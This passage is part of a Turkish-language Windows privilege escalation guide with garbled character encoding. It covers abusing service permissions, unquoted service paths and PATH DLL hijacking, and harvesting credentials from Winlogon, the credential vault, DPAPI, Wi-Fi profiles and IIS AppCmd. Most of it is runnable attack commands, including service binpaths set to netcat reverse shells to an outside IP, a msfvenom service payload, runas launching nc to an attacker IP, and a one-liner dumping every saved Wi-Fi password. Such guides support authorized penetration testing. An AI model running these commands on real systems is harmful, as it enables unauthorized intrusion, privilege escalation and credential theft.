**Sysinternals**'den **procdump** kullanarak Ã§alÄ±ÅŸan bir iÅŸlemin bellek dÃ¶kÃ¼mÃ¼nÃ¼ oluÅŸturabilirsiniz. FTP gibi hizmetlerde **ÅŸifreler aÃ§Ä±k metin olarak bellekte** bulunur, belleÄŸi dÃ¶kerek ÅŸifreleri okumaya Ã§alÄ±ÅŸÄ±n.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### GÃ¼vensiz GUI uygulamalarÄ±

**SISTEM olarak Ã§alÄ±ÅŸan uygulamalar, bir kullanÄ±cÄ±nÄ±n CMD baÅŸlatmasÄ±na veya dizinleri gezmesine izin verebilir.**

Ã–rnek: "Windows YardÄ±m ve Destek" (Windows + F1), "komut istemi" arayÄ±n, "Komut Ä°stemi'ni AÃ§mak Ä°Ã§in TÄ±klayÄ±n" Ã¼zerine tÄ±klayÄ±n

## Hizmetler

Hizmet listesini al:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Ä°zinler

Bir hizmetin bilgilerini almak iÃ§in **sc** komutunu kullanabilirsiniz.

```bash
sc qc <service_name>
```

Ã–nerilen, her bir servis iÃ§in gerekli ayrÄ±calÄ±k seviyesini kontrol etmek iÃ§in _Sysinternals_ 'den **accesschk** ikilisine sahip olmaktÄ±r.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Ã–nerilen, "Authenticated Users"Ä±n herhangi bir hizmeti deÄŸiÅŸtirip deÄŸiÅŸtiremeyeceÄŸini kontrol etmektir:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[XP iÃ§in accesschk.exe'yi buradan indirebilirsiniz](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Hizmeti EtkinleÅŸtir

EÄŸer bu hatayla karÅŸÄ±laÅŸÄ±yorsanÄ±z (Ã¶rneÄŸin SSDPSRV ile):

_1058 sistem hatasÄ± oluÅŸtu._\
_Hizmet baÅŸlatÄ±lamÄ±yor, ya devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ± ya da ona baÄŸlÄ± etkin cihazlar yok._

EtkinleÅŸtirebilirsiniz:

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**SSDPSRV'nin Ã§alÄ±ÅŸmasÄ± iÃ§in upnphost hizmetinin (XP SP1 iÃ§in) baÄŸÄ±mlÄ± olduÄŸunu unutmayÄ±n.**

Bu sorunun **baÅŸka bir Ã§Ã¶zÃ¼mÃ¼** ÅŸudur:

```
sc.exe config usosvc start= auto
```

### **Hizmet ikili yolu deÄŸiÅŸtirme**

"Kimlik doÄŸrulama yapÄ±lmÄ±ÅŸ kullanÄ±cÄ±lar" grubunun bir hizmet Ã¼zerinde **SERVICE\_ALL\_ACCESS** yetkisine sahip olduÄŸu senaryoda, hizmetin yÃ¼rÃ¼tÃ¼lebilir ikilisinin deÄŸiÅŸtirilmesi mÃ¼mkÃ¼ndÃ¼r. **sc**'yi deÄŸiÅŸtirmek ve yÃ¼rÃ¼tmek iÃ§in:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Servisi yeniden baÅŸlat

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

AyrÄ±calÄ±klar Ã§eÅŸitli izinler aracÄ±lÄ±ÄŸÄ±yla yÃ¼kseltilebilir:

* **SERVICE\_CHANGE\_CONFIG**: Hizmet ikili yapÄ±landÄ±rmasÄ±na izin verir.
* **WRITE\_DAC**: Ä°zin yeniden yapÄ±landÄ±rma imkanÄ± saÄŸlar, bu da hizmet yapÄ±landÄ±rmalarÄ±nÄ± deÄŸiÅŸtirme yeteneÄŸine yol aÃ§ar.
* **WRITE\_OWNER**: Sahiplik edinme ve izin yeniden yapÄ±landÄ±rma izni verir.
* **GENERIC\_WRITE**: Hizmet yapÄ±landÄ±rmalarÄ±nÄ± deÄŸiÅŸtirme yeteneÄŸini devralÄ±r.
* **GENERIC\_ALL**: AyrÄ±ca hizmet yapÄ±landÄ±rmalarÄ±nÄ± deÄŸiÅŸtirme yeteneÄŸini devralÄ±r.

Bu zafiyetin tespiti ve istismarÄ± iÃ§in _exploit/windows/local/service\_permissions_ kullanÄ±labilir.

### Hizmet ikilileri zayÄ±f izinler

**Hizmet tarafÄ±ndan yÃ¼rÃ¼tÃ¼len ikili dosyayÄ± deÄŸiÅŸtirip deÄŸiÅŸtiremeyeceÄŸinizi** veya ikili dosyanÄ±n bulunduÄŸu klasÃ¶rde **yazma izinlerinizin olup olmadÄ±ÄŸÄ±nÄ±** kontrol edin ([**DLL Hijacking**](dll-hijacking/))**.**\
Hizmet tarafÄ±ndan yÃ¼rÃ¼tÃ¼len her ikili dosyayÄ± **wmic** kullanarak (system32'de deÄŸil) alabilir ve izinlerinizi **icacls** kullanarak kontrol edebilirsiniz:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

AyrÄ±ca **sc** ve **icacls** kullanabilirsiniz:

```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

### Hizmetler kayÄ±t defteri deÄŸiÅŸtirme izinleri

Herhangi bir hizmet kayÄ±t defterini deÄŸiÅŸtirip deÄŸiÅŸtiremeyeceÄŸinizi kontrol etmelisiniz.\
Bunu yapmak iÃ§in aÅŸaÄŸÄ±dakileri yapabilirsiniz:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

**Authenticated Users** veya **NT AUTHORITY\INTERACTIVE**'in `FullControl` izinlerine sahip olup olmadÄ±ÄŸÄ± kontrol edilmelidir. EÄŸer Ã¶yleyse, hizmet tarafÄ±ndan yÃ¼rÃ¼tÃ¼len ikili dosya deÄŸiÅŸtirilebilir.

YÃ¼rÃ¼tÃ¼len ikili dosyanÄ±n Yol'unu deÄŸiÅŸtirmek iÃ§in:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Hizmetler kayÄ±t defteri AppendData/AddSubdirectory izinleri

EÄŸer bir kayÄ±t defteri Ã¼zerinde bu izne sahipseniz, bu demektir ki **bu birinden alt kayÄ±t defterleri oluÅŸturabilirsiniz**. Windows hizmetleri durumunda bu, **keyfi kodu yÃ¼rÃ¼tmek iÃ§in yeterlidir:**

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### TÄ±rnak Ä°Ã§ermeyen Hizmet YollarÄ±

EÄŸer bir yÃ¼rÃ¼tÃ¼lebilir dosyanÄ±n yolu tÄ±rnak iÃ§inde deÄŸilse, Windows her boÅŸluktan Ã¶nceki her biti yÃ¼rÃ¼tmeye Ã§alÄ±ÅŸacaktÄ±r.

Ã–rneÄŸin, _C:\Program Files\Some Folder\Service.exe_ yolu iÃ§in Windows, ÅŸunlarÄ± yÃ¼rÃ¼tmeye Ã§alÄ±ÅŸacaktÄ±r:

```powershell
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

### Dahili Windows hizmetlerine ait olmayan tÃ¼m tÄ±rnak iÃ§i olmayan hizmet yollarÄ±nÄ± listeleyin:

```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Bu zafiyeti** metasploit ile tespit edebilir ve sÃ¶mÃ¼rebilirsiniz: `exploit/windows/local/trusted\_service\_path` Metasploit ile manuel olarak bir hizmet ikili oluÅŸturabilirsiniz:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Kurtarma Ä°ÅŸlemleri

Windows, bir hizmet baÅŸarÄ±sÄ±z olduÄŸunda alÄ±nacak Ã¶nlemleri belirlemek iÃ§in kullanÄ±cÄ±lara izin verir. Bu Ã¶zellik bir ikili dosyaya iÅŸaret etmek Ã¼zere yapÄ±landÄ±rÄ±labilir. Bu ikili dosya deÄŸiÅŸtirilebilirse, ayrÄ±calÄ±k yÃ¼kseltme mÃ¼mkÃ¼n olabilir. Daha fazla ayrÄ±ntÄ±ya [resmi belgelerde](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN) bulunabilir.

## Uygulamalar

### YÃ¼klÃ¼ Uygulamalar

**Ä°kili dosyalarÄ±n izinlerini** kontrol edin (belki birini Ã¼zerine yazabilir ve ayrÄ±calÄ±klarÄ± yÃ¼kseltebilirsiniz) ve **dizinlerin** izinlerini kontrol edin ([DLL KaldÄ±rma](dll-hijacking/)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

### Yazma Ä°zinleri

BazÄ± yapÄ±landÄ±rma dosyalarÄ±nÄ± deÄŸiÅŸtirip Ã¶zel bir dosyayÄ± okuyup okuyamayacaÄŸÄ±nÄ±zÄ± veya bir YÃ¶netici hesabÄ± tarafÄ±ndan yÃ¼rÃ¼tÃ¼lecek bir ikili dosyayÄ± deÄŸiÅŸtirip deÄŸiÅŸtiremeyeceÄŸinizi kontrol edin (schedtasks).

Sistemde zayÄ±f klasÃ¶r/dosya izinlerini bulmanÄ±n bir yolu ÅŸÃ¶yledir:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### BaÅŸlangÄ±Ã§ta Ã§alÄ±ÅŸtÄ±r

**FarklÄ± bir kullanÄ±cÄ± tarafÄ±ndan Ã§alÄ±ÅŸtÄ±rÄ±lacak bir kayÄ±t defteri veya ikili dosyayÄ± Ã¼zerine yazabileceÄŸinizi kontrol edin.**\
**AyrÄ±calÄ±klarÄ± yÃ¼kseltmek iÃ§in ilginÃ§ otomatik Ã§alÄ±ÅŸtÄ±rma konumlarÄ±nÄ± Ã¶ÄŸrenmek iÃ§in** aÅŸaÄŸÄ±daki sayfayÄ± **okuyun**:

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### SÃ¼rÃ¼cÃ¼ler

**Muhtemel Ã¼Ã§Ã¼ncÃ¼ taraf garip/korunmasÄ±z sÃ¼rÃ¼cÃ¼ler arayÄ±n**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

## YOL DLL KaÃ§Ä±rma

EÄŸer **PATH'te bulunan bir klasÃ¶rde yazma izinleriniz varsa**, bir sÃ¼reÃ§ tarafÄ±ndan yÃ¼klenen bir DLL'yi kaÃ§Ä±rabilir ve **yetkileri yÃ¼kseltebilirsiniz**.

PATH iÃ§indeki tÃ¼m klasÃ¶rlerin izinlerini kontrol edin:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Bu denetimi nasÄ±l kÃ¶tÃ¼ye kullanabileceÄŸiniz hakkÄ±nda daha fazla bilgi iÃ§in:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## AÄŸ

### PaylaÅŸÄ±mlar

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts dosyasÄ±

DiÄŸer bilinen bilgisayarlarÄ± hosts dosyasÄ±nda sabitlenmiÅŸ olarak kontrol edin

```
type C:\Windows\System32\drivers\etc\hosts
```

### AÄŸ ArayÃ¼zleri ve DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### AÃ§Ä±k Portlar

DÄ±ÅŸarÄ±dan **kÄ±sÄ±tlanmÄ±ÅŸ hizmetleri** kontrol edin

```bash
netstat -ano #Opened ports?
```

### YÃ¶nlendirme Tablosu

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP Tablosu

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### GÃ¼venlik DuvarÄ± KurallarÄ±

[**GÃ¼venlik DuvarÄ± ile ilgili komutlar iÃ§in bu sayfaya bakÄ±n**](../basic-cmd-for-pentesters.md#firewall) **(kurallarÄ± listele, kurallar oluÅŸtur, kapat, kapat...)**

Daha fazla [aÄŸ taramasÄ± komutu burada](../basic-cmd-for-pentesters.md#network)

### Windows Alt Sistemi Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binary `bash.exe` ayrÄ±ca `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` konumunda bulunabilir.

Root kullanÄ±cÄ±sÄ±nÄ± elde ettiÄŸinizde herhangi bir porta dinleyebilirsiniz (`nc.exe`'yi ilk kez bir porta dinlemek iÃ§in kullandÄ±ÄŸÄ±nÄ±zda, gÃ¼venlik duvarÄ± tarafÄ±ndan `nc`'nin izin verilip verilmeyeceÄŸi GUI aracÄ±lÄ±ÄŸÄ±yla sorulacaktÄ±r).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Bash'Ä± kolayca root olarak baÅŸlatmak iÃ§in `--default-user root` komutunu deneyebilirsiniz.

`WSL` dosya sistemini `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` klasÃ¶rÃ¼nde keÅŸfedebilirsiniz.

## Windows Kimlik Bilgileri

### Winlogon Kimlik Bilgileri

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

### Kimlik bilgileri yÃ¶neticisi / Windows kasasÄ±

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault, **Windows**'un **kullanÄ±cÄ±larÄ± otomatik olarak giriÅŸ yapabileceÄŸi sunucular, web siteleri ve diÄŸer programlar iÃ§in kullanÄ±cÄ± kimlik bilgilerini depolar**. Ä°lk bakÄ±ÅŸta, bu, kullanÄ±cÄ±larÄ±n Facebook kimlik bilgilerini, Twitter kimlik bilgilerini, Gmail kimlik bilgilerini vb. depolayabileceÄŸi ve bÃ¶ylece tarayÄ±cÄ±lar aracÄ±lÄ±ÄŸÄ±yla otomatik olarak giriÅŸ yapabileceÄŸi anlamÄ±na gelebilir. Ancak durum bÃ¶yle deÄŸil.

Windows Vault, Windows'un kullanÄ±cÄ±larÄ± otomatik olarak giriÅŸ yapabileceÄŸi kimlik bilgilerini depolar, yani **Windows'un bir kaynaÄŸa eriÅŸmek iÃ§in kimlik bilgilerine ihtiyaÃ§ duyan herhangi bir Windows uygulamasÄ±**, bu Kimlik Bilgileri YÃ¶neticisi ve Windows Vault'tan yararlanabilir ve kullanÄ±cÄ±larÄ±n sÃ¼rekli olarak kullanÄ±cÄ± adÄ± ve ÅŸifreyi girmesi yerine saÄŸlanan kimlik bilgilerini kullanabilir.

Uygulamalar Kimlik Bilgileri YÃ¶neticisi ile etkileÅŸime geÃ§medikÃ§e, belirli bir kaynaÄŸÄ±n kimlik bilgilerini kullanmalarÄ±nÄ±n mÃ¼mkÃ¼n olmadÄ±ÄŸÄ±nÄ± dÃ¼ÅŸÃ¼nmÃ¼yorum. Bu nedenle, uygulamanÄ±zÄ±n kasayÄ± kullanmak istemesi durumunda, varsayÄ±lan depolama kasasÄ±ndan bu kaynaÄŸÄ±n kimlik bilgilerini nasÄ±l alacaÄŸÄ±nÄ± **kimlik bilgilerini talep etmek Ã¼zere kimlik bilgileri yÃ¶neticisiyle iletiÅŸim kurmasÄ± gerekmektedir**.

Makinede depolanan kimlik bilgilerini listelemek iÃ§in `cmdkey`'i kullanÄ±n.

```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```

ArdÄ±ndan kayÄ±tlÄ± kimlik bilgilerini kullanmak iÃ§in `runas`'Ä± `/savecred` seÃ§enekleriyle kullanabilirsiniz. AÅŸaÄŸÄ±daki Ã¶rnek, bir SMB paylaÅŸÄ±mÄ± aracÄ±lÄ±ÄŸÄ±yla uzak bir ikili dosyayÄ± Ã§aÄŸÄ±rÄ±yor.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

`runas` komutunu saÄŸlanan bir kimlik bilgi seti ile kullanma.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Not: mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials\_file\_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault\_password\_view.html) veya [Empire Powershells modÃ¼lÃ¼nden](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/dumpCredStore.ps1).

### DPAPI

**Veri Koruma API'si (DPAPI)**, verilerin simetrik ÅŸifrelemesi iÃ§in bir yÃ¶ntem saÄŸlar ve genellikle Windows iÅŸletim sisteminde asimetrik Ã¶zel anahtarlarÄ±n simetrik ÅŸifrelemesi iÃ§in kullanÄ±lÄ±r. Bu ÅŸifreleme, entropiye Ã¶nemli Ã¶lÃ§Ã¼de katkÄ±da bulunan bir kullanÄ±cÄ± veya sistem sÄ±rrÄ±nÄ± kullanÄ±r.

**DPAPI, kullanÄ±cÄ±nÄ±n giriÅŸ sÄ±rlarÄ±ndan tÃ¼retilen simetrik bir anahtar aracÄ±lÄ±ÄŸÄ±yla anahtarlarÄ±n ÅŸifrelenmesini saÄŸlar**. Sistem ÅŸifrelemesi iÃ§eren senaryolarda, sistem alan kimlik doÄŸrulama sÄ±rlarÄ±nÄ± kullanÄ±r.

DPAPI kullanÄ±larak ÅŸifrelenmiÅŸ kullanÄ±cÄ± RSA anahtarlarÄ±, `%APPDATA%\Microsoft\Protect\{SID}` dizininde depolanÄ±r, burada `{SID}` kullanÄ±cÄ±nÄ±n [GÃ¼venlik TanÄ±mlayÄ±cÄ±sÄ±nÄ±](https://en.wikipedia.org/wiki/Security\_Identifier) temsil eder. **DPAPI anahtarÄ±, genellikle kullanÄ±cÄ±nÄ±n Ã¶zel anahtarlarÄ±nÄ± koruyan anahtarla aynÄ± dosyada bulunan anahtar**, tipik olarak 64 byte'lÄ±k rastgele veriden oluÅŸur. (Bu dizine eriÅŸim kÄ±sÄ±tlÄ±dÄ±r ve CMD'de `dir` komutuyla iÃ§eriÄŸini listelemeyi engeller, ancak PowerShell aracÄ±lÄ±ÄŸÄ±yla listelenebilir).

```powershell
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

**Mimikatz modÃ¼lÃ¼nÃ¼** uygun argÃ¼manlarla (`/pvk` veya `/rpc`) kullanarak ÅŸifrelemeyi Ã§Ã¶zebilirsiniz.

Genellikle **ana ÅŸifre ile korunan kimlik dosyalarÄ±** ÅŸurada bulunur:

```powershell
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

**Mimikatz modÃ¼lÃ¼** `dpapi::cred`'i uygun `/masterkey` ile kullanarak ÅŸifrelemeyi Ã§Ã¶zebilirsiniz.\
EÄŸer kÃ¶k kullanÄ±cÄ±ysanÄ±z, `sekurlsa::dpapi` modÃ¼lÃ¼ ile **bellekten** birÃ§ok **DPAPI masterkey** Ã§Ä±karabilirsiniz.

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### PowerShell Kimlik Bilgileri

**PowerShell kimlik bilgileri** genellikle **betik** ve otomasyon gÃ¶revleri iÃ§in ÅŸifrelenmiÅŸ kimlik bilgilerini saklamak iÃ§in kullanÄ±lÄ±r. Kimlik bilgileri genellikle **DPAPI** kullanÄ±larak korunur, bu da genellikle yalnÄ±zca aynÄ± kullanÄ±cÄ± tarafÄ±ndan ve aynÄ± bilgisayarda oluÅŸturulduklarÄ± bilgisayar Ã¼zerinde Ã§Ã¶zÃ¼lebileceÄŸi anlamÄ±na gelir.

DosyasÄ±nda bulunan bir PS kimlik bilgisini **Ã§Ã¶zmek** iÃ§in ÅŸunlarÄ± yapabilirsiniz:

```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### KaydedilmiÅŸ RDP BaÄŸlantÄ±larÄ±

OnlarÄ± `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\` ve `HKCU\Software\Microsoft\Terminal Server Client\Servers\` dizinlerinde bulabilirsiniz.

### Son Zamanlarda Ã‡alÄ±ÅŸtÄ±rÄ±lan Komutlar

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Uzak MasaÃ¼stÃ¼ Kimlik Bilgileri YÃ¶neticisi**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

**Mimikatz** `dpapi::rdg` modÃ¼lÃ¼nÃ¼ uygun `/masterkey` ile kullanarak **.rdg dosyalarÄ±nÄ±** ÅŸifreleyebilirsiniz.\
Mimikatz `sekurlsa::dpapi` modÃ¼lÃ¼ ile bellekten birÃ§ok DPAPI anahtarÄ±nÄ± Ã§Ä±karabilirsiniz.

### YapÄ±ÅŸkan Notlar

Ä°nsanlar genellikle Windows iÅŸ istasyonlarÄ±nda StickyNotes uygulamasÄ±nÄ± kullanarak **ÅŸifreleri** ve diÄŸer bilgileri kaydederler, bu dosyanÄ±n bir veritabanÄ± dosyasÄ± olduÄŸunun farkÄ±nda olmadan. Bu dosya `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda bulunur ve her zaman aranmaya ve incelenmeye deÄŸerdir.

### AppCmd.exe

**AppCmd.exe**'den ÅŸifreleri kurtarmak iÃ§in YÃ¶netici olmanÄ±z ve YÃ¼ksek BÃ¼tÃ¼nlÃ¼k seviyesinde Ã§alÄ±ÅŸmanÄ±z gerektiÄŸini unutmayÄ±n.\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` dizininde bulunur.\
Bu dosya mevcutsa, bazÄ± **kimlik bilgilerinin** yapÄ±landÄ±rÄ±lmÄ±ÅŸ olabileceÄŸi ve **kurtarÄ±labilir** olduÄŸu mÃ¼mkÃ¼ndÃ¼r.

Bu kod [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)'dan Ã§Ä±karÄ±lmÄ±ÅŸtÄ±r:

```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
